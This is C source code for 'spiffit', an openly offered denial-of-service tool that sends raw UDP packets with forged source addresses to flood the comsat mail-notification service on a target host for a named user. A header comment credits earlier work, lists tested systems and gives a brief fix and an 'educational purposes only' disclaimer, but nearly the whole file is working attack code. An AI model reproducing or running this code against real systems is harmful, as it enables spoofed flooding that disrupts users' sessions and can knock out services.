

/* spiffit.c v1 by neophyte@efnet

   Based on source by Arny to send spoofed UDP datagrams, could be used as  
   a DoS against users with 'biff y' set on machines running in.comsat --
   The original idea was by sygma (biffit.c), I just added the spoof
   routines to show that it was possible to get around his suggested
   hosts.allow fix.

   Tested on:
   Slackware and Redhat Linux distros,
   FreeBSD 2.2.5-Stable
   NetBSD 1.2

   BSD boxes appear to be greatly affected by this (I've had unconfirmed
   reports of all services needing to be restarted).

   Fix: Users should set `biff n` to avoid screenfulls of new-mail
   messages, admins on severly affected boxes should look at shutting off
   the in.comsat daemon.

   Notes: Use this to test your own network, this source if for
   educational purposes only.

   Greets: Werd up to sygma, #j00nix, the snickers and EXiLE lads.
*/
 
#include<sys/types.h>
#include<sys/socket.h>
#include<netinet/in_systm.h>
#include<netinet/in.h>
#include<netinet/ip.h>
#include<netinet/udp.h>
#include<errno.h>
#include<string.h>
#include<netdb.h>
#include<arpa/inet.h>
#include<stdio.h>
#define MYPORT 512

struct sockaddr sa;

spiffit_main(int argc,char **argv)
{
int fd, killloop;
int x=1;
char message[10];
struct sockaddr_in *p;
struct hostent *he;
u_char gram[38]=
	{
	0x45,	0x00,	0x00,	0x26,
	0x12,	0x34,	0x00,	0x00,
	0xFF,	0x11,	0,	0,
	0,	0,	0,	0,
	0,	0,	0,	0,

	0,	0,	0,	0,
	0x00,	0x12,	0x00,	0x00
	};

   if(argc!=6) {
      fprintf(stderr,"Usage: %s <source> <src_port> <dest> <username> <number_of_packets>\n",*argv);
      exit(1);
   };

   if(strlen(argv[4]) > 8) {
      fprintf(stderr,"Error: Username is too long\n");
      exit(1);
   }

   if((he=gethostbyname(argv[1]))==NULL) {
      fprintf(stderr,"can't resolve source hostname\n");
      exit(1);
   };
   bcopy(*(he->h_addr_list),(gram+12),4);

   if((he=gethostbyname(argv[3]))==NULL) {
      fprintf(stderr,"can't resolve destination hostname\n");
      exit(1);
   };
   bcopy(*(he->h_addr_list),(gram+16),4);

   *(u_short*)(gram+20)=htons((u_short)atoi(argv[2]));
   *(u_short*)(gram+22)=htons(MYPORT);
   sprintf(message,"%s@0",argv[4]);
   bcopy(message,(gram+28),strlen(message));

   p=(struct sockaddr_in*)&sa;
   p->sin_family=AF_INET;
   bcopy(*(he->h_addr_list),&(p->sin_addr),sizeof(struct in_addr));

   if((fd=socket(AF_INET,SOCK_RAW,IPPROTO_RAW))== -1) {
      perror("socket");
      exit(1);
   };
#ifdef IP_HDRINCL
   if (setsockopt(fd,IPPROTO_IP,IP_HDRINCL,(char*)&x,sizeof(x))<0)
   {
      perror("setsockopt IP_HDRINCL");
      exit(1);
   };
#else
   fprintf(stderr,"Error: We don't have IP_HDRINCL\n");
#endif
   fprintf(stderr,"Spiffit v1, Flooding: ");
   for (killloop=1;killloop<=atoi(argv[5]); killloop++) {
      if((sendto(fd, &gram, sizeof(gram), 0,(struct sockaddr *)p,
         sizeof(struct sockaddr)))== -1) {
         perror("sendto");
         exit(1);
      };
   fprintf(stderr,".");
   }
   fprintf(stderr," Done!\n");
}
